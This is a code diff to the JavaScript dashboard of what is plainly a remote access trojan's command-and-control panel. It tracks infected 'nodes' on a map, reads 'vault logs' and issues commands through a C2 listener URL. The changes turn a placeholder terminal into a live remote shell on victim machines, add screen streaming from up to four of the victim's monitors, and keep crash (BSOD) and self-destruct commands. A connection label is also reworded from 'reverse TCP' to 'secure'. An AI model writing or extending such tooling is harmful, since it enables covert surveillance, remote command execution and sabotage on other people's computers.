@@ -20,7 +20,8 @@ let streamInterval = null;
 let activeStream = { type: null, monitor: 0 };
 const STREAM_POLL_RATE = 250; 
 
-// --- Filesystem State ---
+// --- Terminal & Filesystem State ---
+let terminalPollInterval = null; // NEW: Real terminal polling
 let fsPollInterval = null;
 let currentFsPath = null;
 const FS_POLL_RATE = 2000; 
@@ -29,6 +30,7 @@ const FS_POLL_TIMEOUT = 20000;
 // ==========================================
 // UTILITIES
 // ==========================================
+// Bulletproof coordinate parser to prevent Leaflet NaN crashes
 function getSafeCoord(val, isLat) {
     const defaultCoord = isLat ? 28.5383 : -81.3792;
     if (val === undefined || val === null || val === '') return defaultCoord;
@@ -148,8 +150,6 @@ async function fetchData() {
     btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
 
     try {
-        console.log(`[+] Attempting connection to: ${C2_LISTENER_URL}/node/${deviceId}`);
-        
         const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
             method: 'GET',
             headers: { 
@@ -177,7 +177,6 @@ async function fetchData() {
         renderNodesList();
         renderMap();
         
-        // DO NOT FLY TO MAP YET, TAB IS HIDDEN!
         selectNode(activeNodeId); 
 
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
@@ -205,7 +204,7 @@ async function fetchData() {
                     leafletMap.invalidateSize(); // Forces map to recalculate after becoming visible
                     leafletMap.flyTo([nodeData.lat, nodeData.lng], 4, {duration: 1.5});
                 }
-            }, 150); // Small buffer to ensure CSS transition completes
+            }, 150); 
         };
 
         if (globalData.length === 0) {
@@ -284,58 +283,99 @@ function renderNodesList() {
     });
 }
 
+// ==========================================
+// TERMINAL LOGIC (REAL PASSTHROUGH)
+// ==========================================
 window.selectNode = function(nodeId) {
-    termLog(`Session established. Authenticated as: ${nodeId}`);
-    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via reverse TCP proxy`;
+    appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
+    document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
     document.getElementById('fs-active-node').innerText = nodeId;
+
+    if (terminalPollInterval) {
+        clearInterval(terminalPollInterval);
+    }
+    
+    // NEW: Real Terminal Polling Loop
+    terminalPollInterval = setInterval(async () => {
+        if (!activeNodeId) return;
+        try {
+            const res = await fetch(`${C2_LISTENER_URL}/shell/${activeNodeId}`, {
+                headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
+            });
+            if (res.ok) {
+                const data = await res.json();
+                if (data.outputs && data.outputs.length > 0) {
+                    data.outputs.forEach(out => appendTerminalText(out, "output"));
+                }
+            }
+        } catch(e) {
+            // Silently fail polling to prevent console spam
+        }
+    }, 2000); 
 };
 
-// ==========================================
-// TERMINAL LOGIC
-// ==========================================
-window.termLog = function(msg) {
+function appendTerminalText(msg, type="system") {
     const term = document.getElementById('terminal-output');
     if(!term) return;
     
-    term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', '');
-    const line = document.createElement('div'); 
-    line.className = "text-gray-300 mt-1"; 
-    line.innerText = `[*] ${msg}`;
+    // Remove the blinking prompt temporarily
+    const promptEl = term.querySelector('.terminal-prompt');
+    if (promptEl) promptEl.remove();
+
+    const line = document.createElement('div');
+    if (type === "system") {
+        line.className = "text-gray-500 mt-1 italic"; 
+        line.innerText = `[*] ${msg}`;
+    } else if (type === "user") {
+        line.className = "text-white mt-1 font-bold";
+        line.innerText = msg; 
+    } else if (type === "output") {
+        line.className = "text-gray-300 mt-1 whitespace-pre-wrap break-all"; 
+        line.innerText = msg;
+    }
     term.appendChild(line);
     
+    // Re-add the blinking prompt at the bottom
     const prompt = document.createElement('div'); 
-    prompt.className = "mt-2 text-green-400"; 
-    prompt.innerHTML = `C:\\Users\\System> <span class="cursor-blink"></span>`;
+    prompt.className = "mt-2 text-green-400 terminal-prompt flex flex-shrink-0"; 
+    prompt.innerHTML = `<span class="mr-2">C:\\Users\\System></span> <span class="cursor-blink"></span>`;
     term.appendChild(prompt);
     
     term.scrollTop = term.scrollHeight;
+}
+
+window.termLog = function(msg) { 
+    appendTerminalText(msg, "system"); 
 };
 
 window.executeTermCommand = function(inputEl) {
     const val = inputEl.value.trim();
     if(!val) return;
     
-    const term = document.getElementById('terminal-output');
-    term.innerHTML = term.innerHTML.replace('<span class="cursor-blink"></span>', val);
+    // Print user input to screen immediately
+    appendTerminalText(`C:\\Users\\System> ${val}`, "user");
     
     setTimeout(() => {
-        if(val.toLowerCase() === 'clear') { 
-            term.innerHTML = `<div class="text-green-400">C:\\Users\\System> <span class="cursor-blink"></span></div>`; 
+        if(val.toLowerCase() === 'clear' || val.toLowerCase() === 'cls') { 
+            const term = document.getElementById('terminal-output');
+            term.innerHTML = `
+                <div class="text-cyberBlue">UglyDucky Shell v2.5.0</div>
+                <div class="mt-2 text-green-400 terminal-prompt flex">
+                    <span class="mr-2">C:\\Users\\System></span> <span class="cursor-blink"></span>
+                </div>`;
             inputEl.value = ''; 
             return; 
         }
         
         if(val.toUpperCase() === 'BSOD' || val.toUpperCase() === 'BURN') {
-            termLog(`Forwarding command to C2 server...`);
-            if (val.toUpperCase() === 'BURN') {
-                sendCommandToNode(activeNodeId, "SELF_DESTRUCT");
-            } else {
-                sendCommandToNode(activeNodeId, "BSOD");
-            }
+            termLog(`Forwarding critical payload to C2 server...`);
+            sendCommandToNode(activeNodeId, val.toUpperCase() === 'BURN' ? "SELF_DESTRUCT" : "BSOD");
         } else {
-            termLog(`'${val}' queued. (Note: standard terminal emulation in development)`);
+            // NEW: Send the real shell command to the payload
+            termLog(`Executing command on target: ${val}...`);
+            sendCommandToNode(activeNodeId, `SHELL:${val}`);
         }
-    }, 200);
+    }, 50);
     
     inputEl.value = '';
 };
@@ -348,7 +388,6 @@ async function sendCommandToNode(deviceId, command) {
         return showToast("No active node selected!", "error");
     }
     
-    termLog(`Sending command '${command.split(':')[0]}' to ${deviceId}...`);
     try {
         const response = await fetch(`${C2_LISTENER_URL}/issue`, {
             method: 'POST',
@@ -369,7 +408,7 @@ async function sendCommandToNode(deviceId, command) {
 }
 
 // ==========================================
-// LIVE VIEW STREAMING (HIGH SPEED)
+// LIVE VIEW STREAMING (MULTI-MONITOR UPDATED)
 // ==========================================
 window.startStream = async function(type, monitorIndex = 0) {
     if (!activeNodeId) {
@@ -400,9 +439,12 @@ window.startStream = async function(type, monitorIndex = 0) {
 
     if (type === 'screen') {
         title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-3"></i>Remote Screen: <span class="font-mono">${activeNodeId}</span>`;
+        // NEW: 4 Monitor Button Array
         monitorControls.innerHTML = `
-            <button onclick="startStream('screen', 0)" class="px-3 py-1 text-xs rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Monitor 1</button>
-            <button onclick="startStream('screen', 1)" class="px-3 py-1 text-xs rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Monitor 2</button>
+            <button onclick="startStream('screen', 0)" class="px-3 py-1 text-xs rounded ${monitorIndex === 0 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 1</button>
+            <button onclick="startStream('screen', 1)" class="px-3 py-1 text-xs rounded ${monitorIndex === 1 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 2</button>
+            <button onclick="startStream('screen', 2)" class="px-3 py-1 text-xs rounded ${monitorIndex === 2 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 3</button>
+            <button onclick="startStream('screen', 3)" class="px-3 py-1 text-xs rounded ${monitorIndex === 3 ? 'bg-cyberBlue text-dark font-bold' : 'bg-gray-700 text-gray-300'}">Mon 4</button>
         `;
         monitorControls.classList.remove('hidden');
     } else {
@@ -828,14 +870,12 @@ window.switchTab = function(tabId) {
     document.getElementById('tab-' + tabId).className = `px-6 py-1.5 rounded-md font-bold text-sm transition-all ${activeColor}`;
 
     // --- LEAFLET RESIZE FIX ---
-    // When switching to the RAT tab, force the map to recalculate its size 
-    // multiple times while the CSS animation finishes opening the tab.
     if (tabId === 'rat' && leafletMap) {
         let resizeCount = 0;
         let resizeInterval = setInterval(() => {
             leafletMap.invalidateSize();
             resizeCount++;
-            if (resizeCount > 5) clearInterval(resizeInterval); // Stop after 500ms
+            if (resizeCount > 5) clearInterval(resizeInterval);
         }, 100);
     }
 };
